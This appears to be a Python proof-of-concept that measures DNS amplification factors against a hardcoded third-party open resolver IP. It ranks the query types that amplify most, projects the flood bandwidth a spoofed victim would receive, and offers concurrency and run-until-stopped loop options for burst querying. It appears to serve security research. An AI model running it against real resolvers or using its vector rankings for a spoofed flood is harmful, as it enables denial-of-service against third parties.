#!/usr/bin/env python3
"""
DNS Amplification PoC — Open Recursive Resolver Measurement Tool
Target: 104.236.68.226:53

Measures amplification factor for each query type against an open recursive
resolver by sending legitimate queries and recording exact response sizes.

For research/paper use only. No IP spoofing — all queries sent from local IP.
Attack model (theoretical): attacker spoofs victim IP as source, sends same
small queries to this resolver; resolver sends amplified responses to victim.

Usage:
  python3 dns_amp_poc.py
  python3 dns_amp_poc.py --target 104.236.68.226
  python3 dns_amp_poc.py --target 104.236.68.226 --csv
"""

import socket, struct, random, time, argparse, sys, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass

TARGET_DEFAULT = "104.236.68.226"
PORT = 53
TIMEOUT = 5

QTYPES = {
    "A":     1,
    "NS":    2,
    "CNAME": 5,
    "SOA":   6,
    "MX":    15,
    "TXT":   16,
    "AAAA":  28,
    "SRV":   33,
    "ANY":   255,
    "DNSKEY": 48,
    "DS":    43,
    "RRSIG": 46,
    "NSEC":  47,
    "NSEC3": 50,
    "TLSA":  52,
    "HTTPS": 65,
}

# Domains chosen for maximum response size per query type
TEST_MATRIX = [
    # (domain,          qtype,     note)
    ("verisign.com",    "ANY",     "Full zone metadata — largest ANY response"),
    ("cloudflare.com",  "ANY",     "CDN with many records"),
    ("google.com",      "ANY",     "Major domain ANY"),
    ("verisign.com",    "DNSKEY",  "DNSSEC key — historically largest amplifier"),
    ("cloudflare.com",  "DNSKEY",  "DNSSEC key"),
    ("paypal.com",      "DNSKEY",  "DNSSEC key"),
    ("isc.org",         "DNSKEY",  "DNSSEC reference"),
    ("cloudflare.com",  "NS",      "Many NS records"),
    ("yahoo.com",       "NS",      "Large NS set"),
    ("akamai.com",      "NS",      "CDN NS set"),
    ("google.com",      "MX",      "MX records"),
    ("cloudflare.com",  "MX",      "MX records"),
    ("google.com",      "TXT",     "SPF/DKIM TXT — often large"),
    ("cloudflare.com",  "TXT",     "TXT records"),
    ("google.com",      "A",       "Baseline — small response"),
    ("cloudflare.com",  "AAAA",    "IPv6 baseline"),
]


def build_query(qname: str, qtype_str: str, edns0: bool = False) -> bytes:
    tid     = random.randint(1, 65534)
    # EDNS0 adds an OPT record in ADDITIONAL section — signals large UDP buffer (4096B)
    # Real DNS clients (dig, libraries) always include EDNS0; without it, some resolvers
    # truncate or apply RFC8482 to ANY queries. Include it to measure realistic attack size.
    arcount = 1 if edns0 else 0
    flags   = 0x0100  # QR=0 (query), RD=1 (recursion desired)
    hdr     = struct.pack("!HHHHHH", tid, flags, 1, 0, 0, arcount)
    parts   = qname.encode().split(b".")
    name    = b"".join(struct.pack("B", len(p)) + p for p in parts) + b"\x00"
    q       = struct.pack("!HH", QTYPES[qtype_str], 1)   # QTYPE, QCLASS=IN
    pkt     = hdr + name + q
    if edns0:
        # OPT record: root name (0x00), type=OPT(41), class=4096 (UDP payload size),
        # TTL=0 (extended RCODE + flags = 0), RDLENGTH=0 (no options)
        opt = b"\x00" + struct.pack("!HHiH", 41, 4096, 0, 0)
        pkt += opt
    return pkt


def send_query(target: str, query: bytes, timeout: int = TIMEOUT):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(query, (target, PORT))
        resp, _ = sock.recvfrom(65535)
        return resp
    except socket.timeout:
        return None
    except Exception:
        return None
    finally:
        sock.close()


def parse_rcode(response: bytes) -> str:
    if len(response) < 4:
        return "?"
    flags = struct.unpack("!H", response[2:4])[0]
    rcode = flags & 0xF
    return {0: "NOERROR", 1: "FORMERR", 2: "SERVFAIL", 3: "NXDOMAIN",
            4: "NOTIMP", 5: "REFUSED"}.get(rcode, str(rcode))


def parse_ancount(response: bytes) -> int:
    if len(response) < 8:
        return 0
    return struct.unpack("!H", response[6:8])[0]


def check_recursion_available(response: bytes) -> bool:
    if len(response) < 4:
        return False
    flags = struct.unpack("!H", response[2:4])[0]
    return bool(flags & 0x0080)  # RA bit


@dataclass
class Result:
    domain:    str
    qtype:     str
    note:      str
    query_sz:  int
    resp_sz:   int
    amp_factor: float
    rcode:     str
    ancount:   int
    ra:        bool
    latency_ms: float


def run_poc(target: str, verbose: bool = True, concurrency: int = 1, loops: int = 1) -> list:
    results = []
    _lock   = threading.Lock()
    burst   = 0
    total_sent = 0

    print(f"\n{'='*72}")
    print(f"  DNS Amplification PoC")
    print(f"  Target resolver : {target}:{PORT}")
    print(f"  Method          : UDP — legitimate queries, local source IP")
    print(f"  Concurrency     : {concurrency}  |  Loops: {'∞ (Ctrl+C)' if loops == 0 else loops}")
    print(f"{'='*72}\n")

    if concurrency == 1:
        print(f"  {'Domain':<22} {'QType':<8} {'QSz':>5} {'RSz':>6} {'Amp':>7}  {'RC':<10} {'AN':>4}  Note")
        print(f"  {'-'*22} {'-'*8} {'-'*5} {'-'*6} {'-'*7}  {'-'*10} {'-'*4}  ----")

    def probe_one(domain, qtype, note):
        query = build_query(domain, qtype, edns0=True)
        q_sz  = len(query)
        t0    = time.time()
        resp  = send_query(target, query)
        lat   = (time.time() - t0) * 1000
        if resp is None:
            r_sz = 0; amp = 0.0; rcode = "TIMEOUT"; ancount = 0; ra = False
        else:
            r_sz    = len(resp)
            amp     = r_sz / q_sz
            rcode   = parse_rcode(resp)
            ancount = parse_ancount(resp)
            ra      = check_recursion_available(resp)
        return Result(domain, qtype, note, q_sz, r_sz, amp, rcode, ancount, ra, lat)

    # Expand matrix to fill concurrency slots by repeating entries
    import math
    reps    = max(1, math.ceil(concurrency / len(TEST_MATRIX)))
    work    = (TEST_MATRIX * reps)[:concurrency]

    loop_count = 0
    try:
        while loops == 0 or loop_count < loops:
            loop_count += 1
            burst += 1
            loop_results = []

            with ThreadPoolExecutor(max_workers=concurrency) as pool:
                futs = {pool.submit(probe_one, d, q, n): (d, q, n)
                        for d, q, n in work}
                for f in as_completed(futs):
                    res = f.result()
                    loop_results.append(res)
                    total_sent += 1
                    with _lock:
                        results.append(res)

            if concurrency > 1:
                ok  = sum(1 for r in loop_results if r.resp_sz > 0)
                top = max(loop_results, key=lambda r: r.amp_factor, default=None)
                amp_str = f"{top.amp_factor:.1f}x ({top.qtype}/{top.domain})" if top and top.amp_factor > 0 else "—"
                print(f"  [Burst {burst:>3}] sent={len(loop_results)}  ok={ok}  peak={amp_str}  total_sent={total_sent}")
            else:
                for res in sorted(loop_results, key=lambda r: TEST_MATRIX.index((r.domain, r.qtype, r.note))):
                    amp_str = f"{res.amp_factor:.1f}x" if res.amp_factor > 0 else "—"
                    with _lock:
                        flag = " ◄ MAX" if results and res.amp_factor == max(r.amp_factor for r in results) and res.amp_factor > 1 else ""
                    print(f"  {res.domain:<22} {res.qtype:<8} {res.query_sz:>5} {res.resp_sz:>6} {amp_str:>7}  {res.rcode:<10} {res.ancount:>4}  {res.note[:30]}{flag}")

    except KeyboardInterrupt:
        print(f"\n  [STOPPED]  bursts={burst}  total_queries_sent={total_sent}")

    return results


def print_summary(results: list, target: str):
    open_results = [r for r in results if r.resp_sz > 0]
    if not open_results:
        print("\n  RESOLVER CLOSED — no responses received.")
        return

    max_r   = max(open_results, key=lambda r: r.amp_factor)
    ra_flag = any(r.ra for r in open_results)

    print(f"\n{'='*72}")
    print(f"  SUMMARY")
    print(f"{'='*72}")
    print(f"  Resolver IP        : {target}:{PORT}")
    print(f"  Open recursive     : {'YES — RA bit set in all responses' if ra_flag else 'YES — responds but RA not set'}")
    print(f"  Queries answered   : {len(open_results)}/{len(results)}")
    print(f"  Peak amplification : {max_r.amp_factor:.1f}x  ({max_r.qtype}/{max_r.domain}  {max_r.query_sz}B → {max_r.resp_sz}B)")
    print()

    # Attack impact at common attacker bandwidths
    print(f"  Attack impact (attacker spoofs victim IP, sends queries to this resolver):")
    for bw_gbps in [0.1, 0.5, 1, 10]:
        flood_gbps = bw_gbps * max_r.amp_factor
        print(f"    Attacker {bw_gbps:4.1f} Gbps  →  victim receives {flood_gbps:7.1f} Gbps  ({max_r.qtype} vector)")
    print()

    # Top 5 by amplification
    top5 = sorted(open_results, key=lambda r: r.amp_factor, reverse=True)[:5]
    print(f"  Top 5 amplification vectors:")
    print(f"  {'#':<3} {'QType':<8} {'Domain':<22} {'QSz':>5} → {'RSz':>6}  {'Amp':>7}")
    for i, r in enumerate(top5, 1):
        print(f"  {i:<3} {r.qtype:<8} {r.domain:<22} {r.query_sz:>5}B  {r.resp_sz:>6}B  {r.amp_factor:.1f}x")


def print_csv(results: list):
    print("\nCSV output:")
    print("domain,qtype,query_bytes,response_bytes,amplification,rcode,answer_count,latency_ms")
    for r in results:
        print(f"{r.domain},{r.qtype},{r.query_sz},{r.resp_sz},{r.amp_factor:.2f},{r.rcode},{r.ancount},{r.latency_ms:.0f}")


def main():
    ap = argparse.ArgumentParser(description="DNS Amplification PoC — open resolver measurement")
    ap.add_argument("--target",      default=TARGET_DEFAULT, help="Resolver IP to test")
    ap.add_argument("--csv",         action="store_true",    help="Also output CSV for paper/chart")
    ap.add_argument("--quiet",       action="store_true",    help="Suppress per-query output")
    ap.add_argument("--concurrency", type=int, default=1,    help="Parallel queries per burst (default 1)")
    ap.add_argument("--loops",       type=int, default=1,    help="Number of full matrix loops (0 = run until Ctrl+C)")
    args = ap.parse_args()

    results = run_poc(args.target, verbose=not args.quiet,
                      concurrency=args.concurrency, loops=args.loops)
    print_summary(results, args.target)
    if args.csv:
        print_csv(results)


if __name__ == "__main__":
    main()
